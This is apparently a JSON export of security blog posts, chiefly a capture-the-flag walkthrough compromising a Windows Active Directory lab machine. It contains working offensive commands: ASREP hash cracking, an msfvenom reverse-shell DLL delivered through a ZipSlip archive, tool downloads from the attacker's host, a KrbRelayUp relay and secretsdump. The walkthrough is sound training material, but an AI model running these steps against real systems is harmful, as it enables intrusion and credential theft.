class=\"line\">C:\\Windows\\system32&gt;whoami</span><br><span class=\"line\">whoami</span><br><span class=\"line\">nt authority\\system</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have a shell as <code>SYSTEM</code>, we have successfully compromised this machine and can read the root flag underneath <code>C:\\Users\\Administrator\\Desktop\\root.txt</code>!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This box tested some knowledge of previous machines that I had done before, notably <code>SeImpersonatePrivilege</code> along with IIS exploitation through ASPX reverse shells. The LibreOffice exploitation was new, however I have set up VBA macros in the past so it was helpful to strengthen those skills.</p>\n<p>Big thanks to xct for the development of this machine.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://www.libreoffice.org/get-help/install-howto/\">https://www.libreoffice.org/get-help/install-howto/</a><br><a href=\"https://ask.libreoffice.org/t/how-to-use-shell-from-basic-macro-solved/23590\">https://ask.libreoffice.org/t/how-to-use-shell-from-basic-macro-solved/23590</a><br><a href=\"https://www.revshells.com/\">https://www.revshells.com/</a><br><a href=\"https://github.com/CCob/SweetPotato\">https://github.com/CCob/SweetPotato</a></p>\n"},{"title":"Bruno - Vulnlab","date":"2024-08-02T20:33:03.000Z","keywords":"Vulnlab, Medium, Windows","description":"Bruno is one of the more difficult AD machines that I've done, as all of the attacks in this specific machine are relatively new to me. This machine consists of exploiting a zip archive vulnerability along with pivoting to other user accounts in an AD environment using untraditional methods.","cover":"/images/vulnlab/bruno-vl/bruno_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\nBruno is one of the more difficult AD machines that I've done, as all of the attacks in this specific machine are relatively new to me. This machine consists of exploiting a zip archive vulnerability along with pivoting to other user accounts in an AD environment using untraditional methods.\n\nYou may see the IP update a few times, I did the box multiple times during the writeup portion.\n\n# Enumeration\n\nWe'll first start with our usual NMAP scan.\n\n```\n└─$ sudo nmap 10.10.126.214\n[sudo] password for daz:\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-30 23:18 EDT\nNmap scan report for 10.10.126.214\nHost is up (0.12s latency).\nNot shown: 984 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n21/tcp   open  ftp\n53/tcp   open  domain\n80/tcp   open  http\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n443/tcp  open  https\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n3389/tcp open  ms-wbt-server\n5357/tcp open  wsdapi\n\nNmap done: 1 IP address (1 host up) scanned in 19.90 seconds\n```\n\nGiven the usual ports that for AD (Kerberos, SMB, LDAP) there are a few outliers in our scan, such as FTP and HTTP (more so FTP).\n\nWe'll first start by verifying anonymous logon through FTP.\n\n![](/images/vulnlab/bruno-vl/b.png)\n\nIt seems that we were able to login with null credentials, and there seem to be a few directories for us to look through. We'll come back to this later, as I want to do my initial checks around the AD machine just to see if we are missing anything.\n\nLet's take a look at the web server to see if there's anything we can find.\n\n![](/images/vulnlab/bruno-vl/c.png)\n\nThis looks to be a default IIS webpage, and running directory traversal scans on this webpage did not present me with any endpoints.\n\n```\n└─$ gobuster dir -u http://10.10.126.214 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x aspx\n```\n\nIn that case we'll take a look at SMB to see if there are any shares that we can access.\n\n```\n└─$ smbclient -L 10.10.126.214 -N\nAnonymous login successful\n\nSharename       Type      Comment\n---------       ----      -------\nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.126.214 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\nIt seems that anonymous login is allowed, however we don't have any permissions to view any shares at the moment. We'll most likely need credentials in order to do anything with SMB.\n\nFinally, we'll take a look at LDAP to see if null authentication is allowed (which would allow us to dump domain objects from the domain). We'll need to find the name of the domain, to which we can do with a simple CME command.\n\n```\n└─$ crackmapexec smb 10.10.126.214\nSMB         10.10.126.214     445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)\n```\n\nNow that we have the name of the DC along with the workstation, we'll add it to our `/etc/hosts` file and run LDAPSEARCH against it.\n\n```\n└─$ ldapsearch -x -H ldap://brunodc.bruno.vl -D '' -w '' -b \"DC=bruno,DC=vl\"\n# extended LDIF\n#\n# LDAPv3\n# base <DC=bruno,DC=vl> with scope subtree\n# filter: (objectclass=*)\n# requesting: ALL\n#\n\n# search result\nsearch: 2\nresult: 1 Operations error\ntext: 000004DC: LdapErr: DSID-0C090A58, comment: In order to perform this opera\n tion a successful bind must be completed on the connection., data 0, v4f7c\n\n# numResponses: 1\n```\n\nIt seems that we'll also need credentials to access LDAP.\n\n# Foothold with FTP\n\nGiven that most of our initial access vectors don't seem to bare much fruit, let's take a look back at FTP to see if there's anything we can find.\n\n![](/images/vulnlab/bruno-vl/d.png)\n\nIf you'll notice, there seems to be files related to a `SampleScanner` app within the FTP directory. We've dealt with DLL Hijacking in applications that we have write access to in the past, so this could be a similar situation (specifically for [Trusted](https://dan-feliciano.com/2024/06/05/trusted/)).\n\nThe only issue is that we do not have write access onto this directory at the moment.\n\n```\nftp> ls\n229 Entering Extended Passive Mode (|||49561|)\n150 Opening ASCII mode data connection.\n06-29-22  05:42PM                  165 changelog\n06-28-22  07:15PM                  431 SampleScanner.deps.json\n06-29-22  03:58PM                 7168 SampleScanner.dll\n06-29-22  03:58PM               174592 SampleScanner.exe\n06-28-22  07:15PM                  170 SampleScanner.runtimeconfig.dev.json\n06-28-22  07:15PM                  154 SampleScanner.runtimeconfig.json\n226 Transfer complete.\nftp> put test.txt\nlocal: test.txt remote: test.txt\n229 Entering Extended Passive Mode (|||49562|)\n550 Access is denied.\nftp>\n```\n\nWhile we don't have write access currently, we do have read access. Let's pull the entirety of this folder back to our localhost to see if there's any important files we can read (specifically changelog).\n\nNOTE: Remember to set your FTP session to \"binary\" mode before you download all of the files. This just makes sure to change all of the downloads from ASCII to Binary, which will convert the `SampleScanner.exe` to an MS-DOS which we won't be able to debug later. You can do so easily by typing `binary` into the FTP console.\n\n```\n└─$ cat changelog\nVersion 0.3\n- integrated with dev site\n- automation using svc_scan\n\nVersion 0.2\n- additional functionality\n\nVersion 0.1\n- initial support for EICAR string\n```\n\nIt seems that there are a few changes implemented on the development side for the `SampleScanner` app itself. The functionality seems to be integrated with a development site and included better support.\n\nThat being said, we do seem to also have an account name that we can potentially try to exploit - `svc_scan`. Let's do our Kerberos checks for this user along with the other default accounts.\n\n```\n└─$ impacket-GetNPUsers -dc-ip 10.10.126.214 -request -usersfile ul.txt -no-pass bruno.vl/'daz'@10.10.126.214\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n$krb5asrep$23$svc_scan@BRUNO.VL:cc4e0a77789388e39[...snip...]2be71ab6dd19a97dcc49c6\n```\n\nWe were successfully able to perform an ASREPRoasting attack against `svc_scan`, meaning we can try and crack this encrypted ASREP ticket for a plaintext password. Our hash identifier is 18200, as you can find [here](https://hashcat.net/wiki/doku.php?id=example_hashes).\n\n```\n└─$ hashcat -a 0 -m 18200 svc_scan.txt /usr/share/wordlists/rockyou.txt\n......\nb6252092fb9116194a8add89f17392c2be71ab6dd19a97dcc49c6:[...snip...]\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)\n```\n\nAs you can see, we were able to crack the ASREP hash and now have the plaintext password for `svc_scan`.\n\nThere are a few things we could do here, such as dumping the domain (given that these are LDAP credentials) or look at SMB/FTP to further our foothold.\n\nTo dump the domain, we'll do the following with the [Bloodhound Python ingestor](https://github.com/dirkjanm/BloodHound.py). If you haven't set up Bloodhound before, [this resource](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux) should be helpful for you.\n\n```\n└─$ bloodhound-python -d 'bruno.vl' -u 'svc_scan' -p '[...snip...]' -c all -ns 10.10.126.214 --zip\n```\n\nYou should then be able to import the compressed domain object archive into Bloodhound to view all the domain objects within LDAP.\n\n![](/images/vulnlab/bruno-vl/e.png)\n\nIt does not seem as though our user has any obscenely prevalent privileges, so we'll have to look elsewhere.\n\nLet's have a look at SMB given that we have credentials to a legitimate user now.\n\n```\n└─$ smbclient -L 10.10.126.214 -U 'svc_scan'\nPassword for [WORKGROUP\\svc_scan]:\n\nSharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nCertEnroll      Disk      Active Directory Certificate Services share\nIPC$            IPC       Remote IPC\nNETLOGON        Disk      Logon server share\nqueue           Disk\nSYSVOL          Disk      Logon server share\nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.126.214 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\nYou'll notice that we now have access to a decent amount of SMB shares, though there is an interesting one that we can see currently. There seems to be a share called `queue`, which if you'll remember, is similar to the name of a directory that we found in FTP.\n\n```\n└─$ smbclient \\\\\\\\10.10.126.214\\\\queue -U 'svc_scan'\nPassword for [WORKGROUP\\svc_scan]:\nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Wed Jun 29 12:33:48 2022\n  ..                                  D        0  Wed Jun 29 09:41:03 2022\n\n7863807 blocks of size 4096. 3739137 blocks available\nsmb: \\> put test.txt\nputting file test.txt as \\test.txt (0.0 kb/s) (average 0.0 kb/s)\nsmb: \\>\n```\n\nIf you'll also notice, we have write access onto this share as well.\n\nThere aren't many other leads - given that we do not have access to any other users at the moment or access to any other services that would be of use to us. The other SMB directories don't seem to hold anything either, as I made sure to enumerate other parts of the machine to make sure I didn't miss anything.\n\n# Reverse Engineering SampleScanner\n\nAt this point, I decided to take a look back at the SampleScanner application to see if we could perform any DLL Hijacking. This is mainly just due to the notion of a DLL and the fact that this application seems to be a custom executable as I could not find source code for it anywhere.\n\nLet's first start by opening ProcMon via the [SysInternalsSuite](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite). Navigate to `Filter > Filter` (or just Ctrl+L), and use the configuration as seen below.\n\n* Process Name - begins with - SampleScanner -> then Include\n* Path - ends with - .dll -> then Include\n* Result - begins with - NAME -> then Include\n\n![](/images/vulnlab/bruno-vl/f.png)\n\nWe'll then apply the filters and ProcMon will start listening to events that fall under our filter settings. Run the binary and you should see some events populate.\n\n![](/images/vulnlab/bruno-vl/g.png)\n\nYou'll get a lot of results, so I've highlighted two important entries that get logged into ProcMon. The two highlights I have are DLLs that are not found within the current directory. The key note here is that they are DLLs that are within the **current directory**, meaning it will be using the same directory that the `SampleScanner` application is within.\n\nThis means we can plant a malicious DLL into the same directory as application and it should execute it, giving us a reverse shell.  But that being said, how can we do so and how do we know what the application is actually doing?\n\nBefore that, I want to note that the executable spits out an error if you run it properly.\n\n```\nPS Microsoft.PowerShell.Core\\FileSystem::\\\\wsl.localhost\\kali-linux\\home\\daz\\tech\\bruno\\scanner\\SampleScanner> .\\SampleScanner.exe\nUnhandled exception. System.IO.DirectoryNotFoundException: Could not find a part of the path 'C:\\samples\\queue'.\n   at System.IO.Enumeration.FileSystemEnumerator`1.CreateDirectoryHandle(String path, Boolean ignoreNotFound)\n   at System.IO.Enumeration.FileSystemEnumerator`1.Init()\n   at System.IO.Enumeration.FileSystemEnumerator`1..ctor(String directory, Boolean isNormalized, EnumerationOptions options)\n   at System.IO.Enumeration.FileSystemEnumerable`1..ctor(String directory, FindTransform transform, EnumerationOptions options, Boolean isNormalized)\n   at System.IO.Enumeration.FileSystemEnumerableFactory.UserFiles(String directory, String expression, EnumerationOptions options)\n   at System.IO.Directory.InternalEnumeratePaths(String path, String searchPattern, SearchTarget searchTarget, EnumerationOptions options)\n   at SampleScanner.Program.Main(String[] args)\n```\n\nThe key thing to look at here is that it seems that a static file path is being searched, the `C:\\samples\\queue` directory. This is interesting because we have write access to this folder via SMB as `svc_scan`.\n\nTo start with reversing the binary itself, we can first examine the `SampleScanner.dll` to see specifically what the executable is doing as this DLL is more than likely associated with the main functionality of the application. We can do so with [ILSpy](https://github.com/icsharpcode/ILSpy), a reverse engineering decompiler used for examining application source code. We'll import the `SampleScanner.dll` into ILSpy.\n\n![](/images/vulnlab/bruno-vl/h.png)\n\nWe're mainly concerned with the Main function inside of the original `SampleScanner` library that is decompiled. \n\nIn the screenshot above, you'll notice that there are various hints about a \"ZipArchive\" entry as a class within the main source code. Let's take a look farther into these classes to see if there's anything we can find.\n\n![](/images/vulnlab/bruno-vl/i.png)\n\nLooking into those classes, it looks like the zip archive is opening the archive itself with `GetEntry` and `get_ArchiveReader`. These contents are then scanned by the application itself to simulate a malware scan.\n\nSo from reverse engineering the binary we discovered three things:\n* A DLL using the relative path of the binary is not being loaded\n* The application itself is attempting to open any archives within a specified directory.\n* The specified directory itself, `C:\\samples\\queue`, is a directory that we have write access onto.\n\nAfter doing some research into what we have in front of us, I came across an interesting exploit that seems to fit our situation - the ZipSlip.\n\n# DLL Hijacking via ZipSlip\n\n[ZipSlip](https://security.snyk.io/research/zip-slip-vulnerability) is essentially a vulnerability that allows us to perform file creation via path traversal in a zip archive. If a zip archive is opened automatically by a program, we can create a compressed archive with a file that has path traversal characters in its name, such as `../revshell.exe`. This will place our executable in the parent folder of where it was opened.\n\nIn our case, we want to place a malicious executable in `../app/(malicious_file_here)`. This should be within the same path as the binary, which is where the application is trying to load DLLs from.\n\nSince we know the names of the DLL that are not found within the application's direct path, we can use those as the names for our malicious DLLs. We can craft a malicious DLL using `msfvenom`, as seen below and then convert it to a zip archive. You can use either `hostfxr.dll` or `Microsoft.DiaSymReader.Native.amd64.dll`, as either will work for this.\n\n```\n└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f dll LHOST=10.8.0.173 LPORT=9001 > hostfxr.dll            \n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo encoder specified, outputting raw payload\nPayload size: 460 bytes\nFinal size of dll file: 9216 bytes\n\n└─$ zip host.zip hostfxr.dll\n  adding: hostfxr.dll (deflated 80%)\n```\n\nWe can then use an archive manager such as 7-Zip File Manager (in my case I transferred the DLL to my Windows host) to view the archive and edit the name accordingly.\n\n![](/images/vulnlab/bruno-vl/j.png)\n\nAs seen above, you can implement directory traversal characters in 7-Zip without any issues. This will create two mock directories within the archive, which will be the traversal method when we transfer it to the target machine.\n\nNow that we have the respective archive set up, let's start up our listener and transfer the archive to the `queue` share. (Note that I changed the name of the archive to `host_sample.zip`)\n\n![](/images/vulnlab/bruno-vl/k.png)\n\nAfter some time as you'll see, the ZipSlip exploit worked properly and the DLL was moved to the `app` directory. After about a minute or so, you'll see that our reverse shell called back and we now should have a session as `svc_scan`.\n\n![](/images/vulnlab/bruno-vl/l.png)\n\n# Internal Enumeration\n\nNow that we have a session on the remote host, we'll do a bit of enumeration on the domain computer to see if there are any ways to escalate our privileges.\n\nThe root `C:\\` drive contains the first user flag as seen below.\n\n```\nPS C:\\> ls\n\nDirectory: C:\\\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----         8/19/2021   6:24 AM                EFI\nd-----         6/29/2022   2:43 PM                inetpub\nd-----          5/8/2021   8:20 AM                PerfLogs\nd-r---         6/29/2022   4:15 PM                Program Files\nd-----         6/29/2022   1:28 PM                Program Files (x86)\nd-----         6/29/2022   1:41 PM                samples\nd-r---         6/29/2022   4:09 PM                Users\nd-----         6/29/2022   1:32 PM                Windows\n-a----         6/29/2022   3:00 PM             37 user.txt\n```\n\nThere does seem to be an `inetpub` directory which contains the default IIS website that we saw previously, however we do not have write access to this part of the system meaning we won't be able to exploit it.\n\nFurthermore, there does not seem to be any outstanding program applications on the internal machine that we can exploit, nor any services that are running on an internal port.\n\nAt this point, I decided to see if an internal machine scraper such as [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS). This should tell us if there are any hidden vulnerabilities that we wouldn't be able to see from an initial glance. \n\n```\nPS C:\\temp> curl http://10.8.0.173:9002/winPEASany_ofs.exe -O winPEASany_ofs.exe\ncurl http://10.8.0.173:9002/winPEASany_ofs.exe -O winPEASany_ofs.exe\nPS C:\\temp> .\\winPEASany_ofs.exe\n......\nChecking KrbRelayUp\n  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#krbrelayup\n  The system is inside a domain (BRUNO) so it could be vulnerable.\n  You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges\n```\n\nAs you'll notice, this should spider the entire filesystem and report any vulnerabilities back to us. The above vulnerability is reported often when I run WinPEAS, however there was something interesting that I found that may we may be able to exploit.\n\n# Privilege Escalation via KrbRelayUp/CLSIDs\n\nOne thing you'll notice is that our user currently has a MAQ of 10. A MAQ, or MachineAccountQuota, essentially allows the domain object to create domain computer objects and use them within the domain.\n\n```\n└─$ nxc ldap 10.10.73.8 -u 'svc_scan' -p '[...snip...]' -M maq\nSMB         10.10.73.8      445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)                                                                                                   \nLDAP        10.10.73.8      389    BRUNODC          [+] bruno.vl\\svc_scan:[...snip...]\nMAQ         10.10.73.8      389    BRUNODC          [*] Getting the MachineAccountQuota\nMAQ         10.10.73.8      389    BRUNODC          MachineAccountQuota: 10\n```\n\nFurthermore, the LDAP does not have signing enabled. This cements the fact that a Kerberos relay attack is possible through KrbRelayUp.\n\n```\n└─$ nxc ldap 10.10.73.8 -u 'svc_scan' -p '[...snip...]' -M ldap-checker\nSMB         10.10.73.8      445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)                                                                                                   \nLDAP        10.10.73.8      389    BRUNODC          [+] bruno.vl\\svc_scan:[...snip...]\nLDAP-CHE... 10.10.73.8      389    BRUNODC          LDAP Signing NOT Enforced!\nLDAP-CHE... 10.10.73.8      389    BRUNODC          LDAPS Channel Binding is set to \"NEVER\"\n```\n\nA Kerberos relay attack is essentially an authentication attack much like NTLM relay that allows us to relay a domain objects Kerberos authentication to another service. This essentially allows us to relay an ASREQ to any SPN that we need to authenticate to. Where LDAP signing essentially plays a picture into this is that it will encrypt all traffic over LDAP, meaning we won't be able to properly sniff the traffic for authentication tokens as a MITM. If you want to delve into more information about Kerberos Relaying and how it works, [this](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html) was the blog post I used mainly as research into the topic.\n\nIn our case, we should be able to create a fake domain computer object and coerce an authentication attempt using RBCD. The only issue is, how do we do coerce authentication if we're using Kerberos authentication? This is where the idea of abusing [CLSIDs](https://www.trendmicro.com/vinfo/us/security/definition/clsid#:~:text=The%20Class%20ID%2C%20or%20CLSID,%5CCLSID%5C%7BCLSID%20value%7D.) comes into play, as CLSIDs are essentially identifiers for application components in Windows. These are predefined by the Windows operating system, meaning we can use a curated list [here](https://github.com/jkerai1/CLSID-Lookup/blob/main/CLSID_no_duplicate_records.txt) or [here](https://vulndev.io/cheats-windows/). We're specifically looking for one that works with Windows Server 2019/2022, as that is the current operating system that we're on.\n\nIn particular, the CLSID I picked was `d99e6e73-fc88-11d0-b498-00a0c90312f3`. We'll need to compile [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp.git) in order to exploit this on the target machine. Luckily enough, Defender is not enabled on this box so we shouldn't have to bypass AV for this.\n\n```\nPS C:\\temp> \"Invoke-Mimikatz\"\n\"Invoke-Mimikatz\"\nInvoke-Mimikatz\n```\n\nSo once we have the `KrbRelayUp` binary compiled, we'll execute it on the target machine using the CLSID that we have selected.\n\n```\nPS C:\\temp> .\\KrbRelayUp.exe relay -Domain bruno.vl -CreateNewComputerAccount -ComputerName daz$ -ComputerPassword Password123@ --clsid d99e6e73-fc88-11d0-b498-00a0c90312f3\n.\\KrbRelayUp.exe relay -Domain bruno.vl -CreateNewComputerAccount -ComputerName daz$ -ComputerPassword Password123@ --clsid d99e6e73-fc88-11d0-b498-00a0c90312f3\nKrbRelayUp - Relaying you to SYSTEM\n\n\n[+] Rewriting function table\n[+] Rewriting PEB\n[+] Init COM server\n[+] Computer account \"daz$\" added with password \"Password123@\"\n[+] Looking for available ports..\n[+] Port 2869 available\n[+] Register COM server\n[+] Forcing SYSTEM authentication\n[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...\n[+] LDAP session established\n[+] RBCD rights added successfully\n[+] Run the spawn method for SYSTEM shell:\n./KrbRelayUp.exe spawn -m rbcd -d bruno.vl -dc brunodc.bruno.vl -cn daz$ -cp Password123@\n```\n\nWe'll then execute the command provided so that a TGT request can be sent to the KDC. This allows us to use `getST` after this command to retrieve a TGS on behalf of the Administrator account to CIFS using our fake machine account.\n\n```\n└─$ impacket-getST -spn cifs/brunodc.bruno.vl -impersonate Administrator -dc-ip 10.10.116.111 bruno.vl/'daz$':'Password123@'\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[*] Getting TGT for user\n[*] Impersonating Administrator\n[*] Requesting S4U2self\n[*] Requesting S4U2Proxy\n[*] Saving ticket in Administrator@cifs_brunodc.bruno.vl@BRUNO.VL.ccache\n```\n\nWe'll then dump the secrets of the machine using `secretsdump`.\n\n```\n└─$ export KRB5CCNAME=Administrator@cifs_brunodc.bruno.vl@BRUNO.VL.ccache\n\n└─$ impacket-secretsdump -k brunodc.bruno.vl                                                                       \nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[*] Service RemoteRegistry is in stopped state\n[*] Starting service RemoteRegistry\n[*] Target system bootKey: 0xf58ac639976f0c99c2dde0d24ef3219d\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\n......\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:13735[...snip...]bfd4:::\n```\n\nNow that we have the Administrator's NT hash, we can use that to login to WinRM.\n\n![](/images/vulnlab/bruno-vl/m.png)\n\nNow that we are currently the Administrator, we can read the root flag within the Administrator's Desktop directory. That means we have successfully rooted this machine!\n\n# Conclusion\n\nThis machine was very difficult, and it gave me some new insight on doing more RBCD exploitation. DLL Hijacking and reverse engineering are both topics that this machine covered well, and I have no complaints. Big thanks to xct for this machine.\n\n# Resources\n\nhttps://hashcat.net/wiki/doku.php?id=example_hashes\nhttps://github.com/dirkjanm/BloodHound.py\nhttps://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\nhttps://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite\nhttps://github.com/icsharpcode/ILSpy\nhttps://security.snyk.io/research/zip-slip-vulnerability\nhttps://github.com/peass-ng/PEASS-ng/tree/master/winPEAS\nhttps://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html\nhttps://www.trendmicro.com/vinfo/us/security/definition/clsid#:~:text=The%20Class%20ID%2C%20or%20CLSID,%5CCLSID%5C%7BCLSID%20value%7D.\nhttps://github.com/jkerai1/CLSID-Lookup/blob/main/CLSID_no_duplicate_records.txt\nhttps://vulndev.io/cheats-windows/\nhttps://github.com/Dec0ne/KrbRelayUp\n\n\n\n","source":"_posts/bruno.md","raw":"---\ntitle: Bruno - Vulnlab\ndate: 2024-08-02 16:33:03\ntags: [vulnlab, Medium]\ncategories: vulnlab\nkeywords: 'Vulnlab, Medium, Windows'\ndescription: Bruno is one of the more difficult AD machines that I've done, as all of the attacks in this specific machine are relatively new to me. This machine consists of exploiting a zip archive vulnerability along with pivoting to other user accounts in an AD environment using untraditional methods.\ncover: /images/vulnlab/bruno-vl/bruno_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\nBruno is one of the more difficult AD machines that I've done, as all of the attacks in this specific machine are relatively new to me. This machine consists of exploiting a zip archive vulnerability along with pivoting to other user accounts in an AD environment using untraditional methods.\n\nYou may see the IP update a few times, I did the box multiple times during the writeup portion.\n\n# Enumeration\n\nWe'll first start with our usual NMAP scan.\n\n```\n└─$ sudo nmap 10.10.126.214\n[sudo] password for daz:\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-30 23:18 EDT\nNmap scan report for 10.10.126.214\nHost is up (0.12s latency).\nNot shown: 984 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n21/tcp   open  ftp\n53/tcp   open  domain\n80/tcp   open  http\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n443/tcp  open  https\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n3389/tcp open  ms-wbt-server\n5357/tcp open  wsdapi\n\nNmap done: 1 IP address (1 host up) scanned in 19.90 seconds\n```\n\nGiven the usual ports that for AD (Kerberos, SMB, LDAP) there are a few outliers in our scan, such as FTP and HTTP (more so FTP).\n\nWe'll first start by verifying anonymous logon through FTP.\n\n![](/images/vulnlab/bruno-vl/b.png)\n\nIt seems that we were able to login with null credentials, and there seem to be a few directories for us to look through. We'll come back to this later, as I want to do my initial checks around the AD machine just to see if we are missing anything.\n\nLet's take a look at the web server to see if there's anything we can find.\n\n![](/images/vulnlab/bruno-vl/c.png)\n\nThis looks to be a default IIS webpage, and running directory traversal scans on this webpage did not present me with any endpoints.\n\n```\n└─$ gobuster dir -u http://10.10.126.214 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x aspx\n```\n\nIn that case we'll take a look at SMB to see if there are any shares that we can access.\n\n```\n└─$ smbclient -L 10.10.126.214 -N\nAnonymous login successful\n\nSharename       Type      Comment\n---------       ----      -------\nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.126.214 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\nIt seems that anonymous login is allowed, however we don't have any permissions to view any shares at the moment. We'll most likely need credentials in order to do anything with SMB.\n\nFinally, we'll take a look at LDAP to see if null authentication is allowed (which would allow us to dump domain objects from the domain). We'll need to find the name of the domain, to which we can do with a simple CME command.\n\n```\n└─$ crackmapexec smb 10.10.126.214\nSMB         10.10.126.214     445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)\n```\n\nNow that we have the name of the DC along with the workstation, we'll add it to our `/etc/hosts` file and run LDAPSEARCH against it.\n\n```\n└─$ ldapsearch -x -H ldap://brunodc.bruno.vl -D '' -w '' -b \"DC=bruno,DC=vl\"\n# extended LDIF\n#\n# LDAPv3\n# base <DC=bruno,DC=vl> with scope subtree\n# filter: (objectclass=*)\n# requesting: ALL\n#\n\n# search result\nsearch: 2\nresult: 1 Operations error\ntext: 000004DC: LdapErr: DSID-0C090A58, comment: In order to perform this opera\n tion a successful bind must be completed on the connection., data 0, v4f7c\n\n# numResponses: 1\n```\n\nIt seems that we'll also need credentials to access LDAP.\n\n# Foothold with FTP\n\nGiven that most of our initial access vectors don't seem to bare much fruit, let's take a look back at FTP to see if there's anything we can find.\n\n![](/images/vulnlab/bruno-vl/d.png)\n\nIf you'll notice, there seems to be files related to a `SampleScanner` app within the FTP directory. We've dealt with DLL Hijacking in applications that we have write access to in the past, so this could be a similar situation (specifically for [Trusted](https://dan-feliciano.com/2024/06/05/trusted/)).\n\nThe only issue is that we do not have write access onto this directory at the moment.\n\n```\nftp> ls\n229 Entering Extended Passive Mode (|||49561|)\n150 Opening ASCII mode data connection.\n06-29-22  05:42PM                  165 changelog\n06-28-22  07:15PM                  431 SampleScanner.deps.json\n06-29-22  03:58PM                 7168 SampleScanner.dll\n06-29-22  03:58PM               174592 SampleScanner.exe\n06-28-22  07:15PM                  170 SampleScanner.runtimeconfig.dev.json\n06-28-22  07:15PM                  154 SampleScanner.runtimeconfig.json\n226 Transfer complete.\nftp> put test.txt\nlocal: test.txt remote: test.txt\n229 Entering Extended Passive Mode (|||49562|)\n550 Access is denied.\nftp>\n```\n\nWhile we don't have write access currently, we do have read access. Let's pull the entirety of this folder back to our localhost to see if there's any important files we can read (specifically changelog).\n\nNOTE: Remember to set your FTP session to \"binary\" mode before you download all of the files. This just makes sure to change all of the downloads from ASCII to Binary, which will convert the `SampleScanner.exe` to an MS-DOS which we won't be able to debug later. You can do so easily by typing `binary` into the FTP console.\n\n```\n└─$ cat changelog\nVersion 0.3\n- integrated with dev site\n- automation using svc_scan\n\nVersion 0.2\n- additional functionality\n\nVersion 0.1\n- initial support for EICAR string\n```\n\nIt seems that there are a few changes implemented on the development side for the `SampleScanner` app itself. The functionality seems to be integrated with a development site and included better support.\n\nThat being said, we do seem to also have an account name that we can potentially try to exploit - `svc_scan`. Let's do our Kerberos checks for this user along with the other default accounts.\n\n```\n└─$ impacket-GetNPUsers -dc-ip 10.10.126.214 -request -usersfile ul.txt -no-pass bruno.vl/'daz'@10.10.126.214\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: 